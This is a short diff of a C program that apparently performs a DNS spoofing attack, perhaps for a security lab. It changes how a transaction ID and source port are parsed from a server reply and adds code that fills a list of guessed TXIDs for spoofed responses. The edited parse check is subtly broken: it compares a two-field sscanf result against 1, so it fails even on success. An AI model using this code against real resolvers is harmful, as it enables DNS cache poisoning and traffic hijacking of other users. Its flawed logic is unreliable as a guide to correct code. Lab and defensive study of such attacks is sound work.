@@ -112,7 +112,7 @@ void run_attack(uint32_t *txid_ls) {
     printf("Received from server: %s\n", txid_buffer);
 
     // Parse the txid
-    if (sscanf(txid_buffer, "TXID: %u, port: %u", &txid, &source_port) != 1) {
+    if (sscanf(txid_buffer, "TXID: %u, Source Port: %u", &txid, &source_port) != 1) {
         fprintf(stderr, "Failed to parse TXID from server response\n");
         close(sockfd);
         exit(EXIT_FAILURE);
@@ -120,7 +120,10 @@ void run_attack(uint32_t *txid_ls) {
 
     printf("Extracted TXID: %u\n", txid);
     printf("source port : %u\n", source_port);
-    txid_ls[0]= txid;
+    fill_txids(txid_ls, txid);
+    for (int i = 0; i < 10; i++) {
+        printf("txid_ls[%d] = %u\n", i, txid_ls[i]);
+    }
     
     // Close the connection
     close(sockfd);
@@ -181,7 +184,7 @@ int build_dns_query(unsigned char *buffer, const char *hostname) {
     return query_len;
 }
 
-// Function to send the DNS query and receive a response
+// Function to send the DNS query 
 void send_dns_query(const char *hostname) {
     int sockfd;
     struct sockaddr_in server_addr;
